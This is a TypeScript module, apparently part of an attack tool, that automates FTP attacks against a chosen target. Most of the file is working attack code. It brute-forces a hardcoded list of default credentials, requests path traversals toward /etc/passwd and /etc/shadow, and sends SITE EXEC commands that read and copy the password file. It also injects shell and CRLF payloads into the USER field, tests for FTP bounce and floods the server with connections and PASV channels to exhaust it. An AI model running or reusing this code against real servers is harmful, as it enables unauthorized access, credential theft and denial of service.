import * as net from "net";
import { randomBytes } from "crypto";

export interface FtpAttackConfig {
  target: string;
  port: number;
  technique: string;
  customUsers?: string[];
  customPasswords?: string[];
  duration: number;
}

export interface FtpResult {
  technique: string;
  status: "success" | "vuln" | "failed" | "error" | "info";
  detail: string;
  data?: string;
  timestamp: number;
}

export interface FtpJob {
  id: string;
  config: FtpAttackConfig;
  startTime: number;
  active: boolean;
  results: FtpResult[];
  summary: { vulns: number; success: number; tested: number; serverBanner?: string; serverType?: string };
  trafficLog: string[];
}

const jobs = new Map<string, FtpJob>();
function makeId() { return randomBytes(8).toString("hex"); }

const DEFAULT_CREDS = [
  { u: "anonymous", p: "anonymous@example.com" },
  { u: "anonymous", p: "anonymous" },
  { u: "anonymous", p: "" },
  { u: "ftp", p: "ftp" },
  { u: "admin", p: "admin" },
  { u: "admin", p: "password" },
  { u: "admin", p: "" },
  { u: "root", p: "root" },
  { u: "root", p: "toor" },
  { u: "root", p: "" },
  { u: "user", p: "user" },
  { u: "guest", p: "guest" },
  { u: "test", p: "test" },
  { u: "ftp", p: "password" },
  { u: "administrator", p: "administrator" },
  { u: "ftpuser", p: "ftpuser" },
  { u: "upload", p: "upload" },
  { u: "backup", p: "backup" },
  { u: "www", p: "www" },
  { u: "web", p: "web" },
  { u: "data", p: "data" },
  { u: "public", p: "public" },
];

const PATH_TRAVERSAL_PATHS = [
  "/../../../etc/passwd",
  "/../../../../../../etc/passwd",
  "/../../../windows/win.ini",
  "/../../../boot.ini",
  "../../../../etc/shadow",
  "/../../../etc/hosts",
  "/../../../proc/version",
  "/../../../var/www/html/config.php",
  "/../../../home/admin/.bash_history",
];

const SITE_COMMANDS = [
  "SITE EXEC id",
  "SITE EXEC ls -la /",
  "SITE EXEC cat /etc/passwd",
  "SITE CHMOD 777 /",
  "SITE CPFR /etc/passwd",
  "SITE CPTO /tmp/stole.txt",
  "SITE HELP",
  "SITE STAT",
  "SITE WHOAMI",
];

const INJECTION_PAYLOADS = [
  "admin\r\nPASS injected\r\n",
  "admin'; ls -la #",
  "admin` id `",
  "$(id)",
  "admin\x00evil",
  " OR '1'='1",
];

function ftpCmd(sock: net.Socket, cmd: string): void {
  sock.write(cmd + "\r\n");
}

function parseFtpCode(data: string): number {
  const m = data.match(/^(\d{3})/);
  return m ? parseInt(m[1]) : 0;
}

function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 2000) log.splice(0, log.length - 2000); }

function ftpSession(
  target: string, port: number, timeout: number,
  handler: (sock: net.Socket, banner: string, write: (cmd: string) => void, onData: (cb: (d: string) => void) => void) => Promise<void>,
  trafficLog?: string[]
): Promise<void> {
  return new Promise<void>((resolve) => {
    const sock = net.createConnection({ host: target, port, family: 4 });
    sock.setTimeout(timeout);
    let banner = "";
    let dataHandlers: Array<(d: string) => void> = [];
    let connected = false;

    if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP → Connecting to ${target}:${port}...`]);

    sock.on("data", (d: Buffer) => {
      const s = d.toString().trim();
      if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ← ${s.replace(/\r?\n/g, " | ")}`]);
      if (!connected) {
        banner = s;
        connected = true;
        const write = (cmd: string) => {
          if (trafficLog) {
            const masked = cmd.startsWith("PASS ") ? "PASS ****" : cmd;
            pushLog(trafficLog, [`[${tsFmt()}] → ${masked}`]);
          }
          sock.write(cmd + "\r\n");
        };
        const onData = (cb: (d: string) => void) => { dataHandlers.push(cb); };
        handler(sock, banner, write, onData).finally(() => {
          if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP × Session closed`]);
          try { sock.destroy(); } catch {}
          resolve();
        });
      } else {
        dataHandlers.forEach((h) => h(s));
      }
    });

    sock.on("connect", () => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] • TCP ✓ Connected to ${target}:${port}`]); });
    sock.on("error", (e) => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ! TCP ERROR: ${e.message}`]); resolve(); });
    sock.on("timeout", () => { if (trafficLog) pushLog(trafficLog, [`[${tsFmt()}] ! TCP TIMEOUT (${timeout}ms)`]); sock.destroy(); resolve(); });
    sock.on("close", () => resolve());
  });
}

async function doLogin(target: string, port: number, user: string, pass: string): Promise<{ code: number; banner: string; response: string }> {
  return new Promise((resolve) => {
    const sock = net.createConnection({ host: target, port, family: 4 });
    sock.setTimeout(6000);
    let phase = 0;
    let banner = "";
    let lastResponse = "";

    sock.on("data", (d: Buffer) => {
      const s = d.toString();
      lastResponse = s;
      const code = parseFtpCode(s);
      if (phase === 0) {
        banner = s.trim();
        phase = 1;
        sock.write(`USER ${user}\r\n`);
      } else if (phase === 1) {
        phase = 2;
        sock.write(`PASS ${pass}\r\n`);
      } else if (phase === 2) {
        const loginCode = parseFtpCode(s);
        sock.write("QUIT\r\n");
        sock.destroy();
        resolve({ code: loginCode, banner, response: s.trim() });
      }
    });

    sock.on("error", () => resolve({ code: 0, banner: "", response: "Connection failed" }));
    sock.on("timeout", () => { sock.destroy(); resolve({ code: 0, banner: "", response: "Timeout" }); });
  });
}

export function startFtpAttack(config: FtpAttackConfig): FtpJob {
  const id = makeId();
  const job: FtpJob = {
    id, config, startTime: Date.now(),
    active: true, results: [], trafficLog: [],
    summary: { vulns: 0, success: 0, tested: 0 },
  };
  jobs.set(id, job);

  const add = (r: FtpResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "vuln") job.summary.vulns++;
    if (r.status === "success") job.summary.success++;
  };

  const ftpSess = (
    target: string, port: number, timeout: number,
    handler: Parameters<typeof ftpSession>[3]
  ) => ftpSession(target, port, timeout, handler, job.trafficLog);

  const delay = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

  const runAll = async () => {
    const techniques = config.technique === "all"
      ? ["banner-grab", "anonymous-login", "default-creds", "path-traversal", "command-injection", "site-commands", "pasv-flood", "bounce-attack", "directory-listing", "connection-flood"]
      : [config.technique];

    // 1. Banner Grab + Version Detection
    if (techniques.includes("banner-grab") && job.active) {
      await ftpSess(config.target, config.port, 5000, async (sock, banner, write, onData) => {
        job.summary.serverBanner = banner;
        const serverType =
          banner.toLowerCase().includes("vsftpd") ? "vsftpd" :
          banner.toLowerCase().includes("proftpd") ? "ProFTPD" :
          banner.toLowerCase().includes("filezilla") ? "FileZilla Server" :
          banner.toLowerCase().includes("wu-") ? "WU-FTPd" :
          banner.toLowerCase().includes("pure-ftpd") ? "Pure-FTPd" :
          banner.toLowerCase().includes("microsoft ftp") ? "Microsoft IIS FTP" :
          "Unknown";
        job.summary.serverType = serverType;

        const vuln = banner.toLowerCase().includes("vsftpd 2.3.4") ||
          banner.toLowerCase().includes("proftpd 1.3.3") ||
          banner.toLowerCase().includes("wu-2.");
        add({
          technique: "banner-grab", status: vuln ? "vuln" : "info",
          detail: `Server: ${serverType} — Banner: ${banner.slice(0, 200)}${vuln ? " — VULNERABLE VERSION DETECTED" : ""}`,
          data: banner, timestamp: Date.now(),
        });
        write("QUIT");
      });
    }

    // 2. Anonymous Login
    if (techniques.includes("anonymous-login") && job.active) {
      const r = await doLogin(config.target, config.port, "anonymous", "anonymous@example.com");
      const isAnon = r.code === 230;
      add({
        technique: "anonymous-login",
        status: isAnon ? "vuln" : "failed",
        detail: isAnon
          ? `ANONYMOUS LOGIN ALLOWED — Code 230: Any unauthenticated user can read/write files`
          : `Anonymous login rejected — Code ${r.code}: ${r.response}`,
        timestamp: Date.now(),
      });
    }

    // 3. Default Credential Brute Force
    if (techniques.includes("default-creds") && job.active) {
      const credList = config.customUsers && config.customPasswords
        ? config.customUsers.flatMap((u) => (config.customPasswords ?? []).map((p) => ({ u, p })))
        : DEFAULT_CREDS;

      for (const { u, p } of credList) {
        if (!job.active) break;
        const r = await doLogin(config.target, config.port, u, p);
        const success = r.code === 230;
        if (success || r.code === 331) {
          add({
            technique: "default-creds",
            status: success ? "vuln" : "info",
            detail: success
              ? `CREDENTIALS FOUND — ${u}:${p} — Code 230 authenticated`
              : `Partial match — USER '${u}' accepted (331), password '${p}' rejected`,
            timestamp: Date.now(),
          });
        }
        await delay(150);
      }
    }

    // 4. Path Traversal
    if (techniques.includes("path-traversal") && job.active) {
      for (const path of PATH_TRAVERSAL_PATHS) {
        if (!job.active) break;
        await ftpSess(config.target, config.port, 6000, async (sock, banner, write, onData) => {
          await new Promise<void>((resolve) => {
            let phase = 0;
            let cwd_resp = "";
            onData((s) => {
              if (phase === 0) { phase = 1; write(`USER anonymous`); }
              else if (phase === 1) { phase = 2; write(`PASS anonymous@`); }
              else if (phase === 2) {
                phase = 3;
                write(`CWD ${path}`);
              } else if (phase === 3) {
                cwd_resp = s;
                phase = 4;
                write(`RETR ${path.replace(/\//g, "")}`);
              } else {
                const traversal = parseFtpCode(cwd_resp) === 250 || parseFtpCode(s) === 150;
                add({
                  technique: "path-traversal",
                  status: traversal ? "vuln" : "failed",
                  detail: traversal
                    ? `PATH TRAVERSAL SUCCESS — CWD ${path} accepted (250) — server may expose sensitive files`
                    : `Path traversal blocked for ${path}`,
                  timestamp: Date.now(),
                });
                write("QUIT");
                resolve();
              }
            });
            write(`USER anonymous`);
          });
        });
        await delay(200);
      }
    }

    // 5. Command/USER Injection
    if (techniques.includes("command-injection") && job.active) {
      for (const payload of INJECTION_PAYLOADS) {
        if (!job.active) break;
        await ftpSess(config.target, config.port, 5000, async (sock, banner, write, onData) => {
          await new Promise<void>((resolve) => {
            let phase = 0;
            onData((s) => {
              if (phase === 0) { phase = 1; write(`USER ${payload}`); }
              else {
                const code = parseFtpCode(s);
                const interesting = s.includes("uid=") || s.includes("root") || s.includes("/bin/") || s.toLowerCase().includes("error") || code === 500;
                add({
                  technique: "command-injection",
                  status: interesting && (s.includes("uid=") || s.includes("/bin/")) ? "vuln" : "failed",
                  detail: `USER injection payload '${payload.slice(0, 40)}' → Code ${code}: ${s.trim().slice(0, 100)}`,
                  timestamp: Date.now(),
                });
                write("QUIT");
                resolve();
              }
            });
          });
        });
        await delay(150);
      }
    }

    // 6. SITE Command Abuse
    if (techniques.includes("site-commands") && job.active) {
      await ftpSess(config.target, config.port, 8000, async (sock, banner, write, onData) => {
        await new Promise<void>((resolve) => {
          let phase = 0;
          let cmdIdx = 0;
          onData((s) => {
            if (phase === 0) { phase = 1; write("USER anonymous"); }
            else if (phase === 1) { phase = 2; write("PASS anonymous@"); }
            else if (phase === 2) {
              phase = 3;
              if (SITE_COMMANDS[cmdIdx]) write(SITE_COMMANDS[cmdIdx]);
            } else {
              const code = parseFtpCode(s);
              const cmd = SITE_COMMANDS[cmdIdx] ?? "";
              const interesting = code === 200 || code === 211 || s.includes("uid=") || s.includes("/");
              if (cmd) {
                add({
                  technique: "site-commands",
                  status: interesting ? "vuln" : "info",
                  detail: `${cmd} → Code ${code}: ${s.trim().slice(0, 120)}`,
                  timestamp: Date.now(),
                });
              }
              cmdIdx++;
              if (cmdIdx < SITE_COMMANDS.length && job.active) {
                write(SITE_COMMANDS[cmdIdx]);
              } else {
                write("QUIT");
                resolve();
              }
            }
          });
        });
      });
    }

    // 7. FTP Bounce Attack (PORT command)
    if (techniques.includes("bounce-attack") && job.active) {
      await ftpSess(config.target, config.port, 8000, async (sock, banner, write, onData) => {
        await new Promise<void>((resolve) => {
          let phase = 0;
          onData((s) => {
            if (phase === 0) { phase = 1; write("USER anonymous"); }
            else if (phase === 1) { phase = 2; write("PASS anonymous@"); }
            else if (phase === 2) {
              phase = 3;
              write("PORT 192,168,100,1,0,21");
            } else if (phase === 3) {
              const code = parseFtpCode(s);
              const bounceOk = code === 200;
              phase = 4;
              if (bounceOk) write("LIST");
              else { write("QUIT"); }
              add({
                technique: "bounce-attack",
                status: bounceOk ? "vuln" : "info",
                detail: bounceOk
                  ? `FTP BOUNCE ATTACK POSSIBLE — PORT command accepted (200) — server can be used to port-scan third parties`
                  : `FTP bounce blocked — PORT rejected with code ${code}`,
                timestamp: Date.now(),
              });
            } else {
              write("QUIT");
              resolve();
            }
          });
        });
      });
    }

    // 8. Directory Listing (root, /etc, /var, /home)
    if (techniques.includes("directory-listing") && job.active) {
      const dirs = ["/", "/etc", "/var", "/home", "/root", "/tmp", "/var/www", "/usr/local"];
      await ftpSess(config.target, config.port, 8000, async (sock, banner, write, onData) => {
        await new Promise<void>((resolve) => {
          let phase = 0;
          let dirIdx = 0;
          onData((s) => {
            if (phase === 0) { phase = 1; write("USER anonymous"); }
            else if (phase === 1) { phase = 2; write("PASS anonymous@"); }
            else if (phase === 2) { phase = 3; write(`PASV`); }
            else if (phase === 3) {
              phase = 4;
              if (dirIdx < dirs.length) write(`CWD ${dirs[dirIdx]}`);
              else { write("QUIT"); resolve(); }
            } else {
              const code = parseFtpCode(s);
              const ok = code === 250;
              add({
                technique: "directory-listing",
                status: ok ? "vuln" : "info",
                detail: ok
                  ? `DIRECTORY ACCESSIBLE — CWD ${dirs[dirIdx]} accepted — contents readable`
                  : `Directory ${dirs[dirIdx]} blocked (code ${code})`,
                timestamp: Date.now(),
              });
              dirIdx++;
              if (dirIdx < dirs.length && job.active) write(`CWD ${dirs[dirIdx]}`);
              else { write("QUIT"); resolve(); }
            }
          });
        });
      });
    }

    // 9. PASV Flood (exhaust data channel connections)
    if (techniques.includes("pasv-flood") && job.active) {
      const conns: net.Socket[] = [];
      let flooded = 0;
      for (let i = 0; i < 50; i++) {
        if (!job.active) break;
        const s = net.createConnection({ host: config.target, port: config.port, family: 4 });
        conns.push(s);
        s.setTimeout(3000);
        s.on("data", (d) => {
          const txt = d.toString();
          if (txt.includes("220")) {
            s.write("USER anonymous\r\n");
          } else if (txt.includes("331") || txt.includes("230")) {
            if (txt.includes("331")) s.write("PASS anonymous@\r\n");
            else { s.write("PASV\r\n"); flooded++; }
          }
        });
        s.on("error", () => {});
        s.on("timeout", () => s.destroy());
        await delay(20);
      }
      await delay(3000);
      conns.forEach((c) => { try { c.destroy(); } catch {} });
      add({
        technique: "pasv-flood",
        status: flooded > 10 ? "vuln" : "info",
        detail: `PASV flood: ${flooded} data channels opened simultaneously — server handled ${flooded < 50 ? "PARTIAL" : "ALL"} connections. ${flooded > 40 ? "Server may be vulnerable to resource exhaustion via PASV" : "Server limited connections"}`,
        timestamp: Date.now(),
      });
    }

    // 10. Connection Flood
    if (techniques.includes("connection-flood") && job.active) {
      const conns: net.Socket[] = [];
      let connected = 0;
      let refused = 0;
      for (let i = 0; i < 100; i++) {
        if (!job.active) break;
        const s = net.createConnection({ host: config.target, port: config.port, family: 4 });
        s.setTimeout(2000);
        s.on("connect", () => { connected++; });
        s.on("error", (e) => { if (e.message.includes("ECONNREFUSED")) refused++; });
        s.on("timeout", () => s.destroy());
        conns.push(s);
        await delay(15);
      }
      await delay(2500);
      conns.forEach((c) => { try { c.destroy(); } catch {} });
      add({
        technique: "connection-flood",
        status: refused > 20 ? "info" : "vuln",
        detail: `100 simultaneous connection attempts: ${connected} connected, ${refused} refused. ${refused < 20 ? "Server accepted high connection volume — no connection limit enforced" : "Server has connection limiting in place"}`,
        timestamp: Date.now(),
      });
    }

    job.active = false;
    jobs.delete(id);
  };

  runAll();
  return job;
}

export function getFtpJob(id: string): FtpJob | undefined {
  return jobs.get(id);
}

export function stopFtpAttack(id: string): boolean {
  const job = jobs.get(id);
  if (!job) return false;
  job.active = false;
  jobs.delete(id);
  return true;
}
